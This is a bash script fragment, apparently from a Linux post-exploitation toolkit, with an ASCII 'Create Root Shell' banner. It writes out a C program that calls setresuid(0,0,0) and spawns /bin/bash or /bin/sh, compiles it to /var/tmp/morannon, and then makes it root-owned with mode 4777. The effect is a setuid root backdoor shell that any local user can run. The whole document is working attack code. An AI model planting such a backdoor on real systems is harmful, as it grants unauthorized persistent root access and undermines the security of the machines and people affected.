#####################
# Create root shell #
#####################

if [ "$ROOTSHELL" ]; then
  echo "
     ____                _         ____             _     ____  _          _ _ 
    / ___|_ __ ___  __ _| |_ ___  |  _ \ ___   ___ | |_  / ___|| |__   ___| | |
   | |   | '__/ _ \/ _\` | __/ _ \ | |_) / _ \ / _ \| __| \___ \| '_ \ / _ \ | |
   | |___| | |  __/ (_| | ||  __/ |  _ < (_) | (_) | |_   ___) | | | |  __/ | |
    \____|_|  \___|\__,_|\__\___| |_| \_\___/ \___/ \__| |____/|_| |_|\___|_|_|
                                                                             
  "

  TMPDIR="/var/tmp"
  GCC=$(command -v gcc 2>/dev/null)
  CHOWN=$(command -v chown 2>/dev/null)
  CHMOD=$(command -v chmod 2>/dev/null)

  # check if /bin/bash exists
  if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi

  fuTITLE "Trying to add a shell as a binary with suid bit set ..."
  sleep 2
  if [ "$BASH" ]; then
    echo 'int main(void){setresuid(0, 0, 0);system("/bin/bash");}' > $TMPDIR/morannon.c
  else
    echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR/morannon.c
  fi
  $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null
  rm $TMPDIR/morannon.c
  
  if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
    ROOTSHELLOK="1" && fuINFO "root shell created"
  else
    ROOTSHELLOK="" && fuERROR "root shell not created"
  fi 

fi
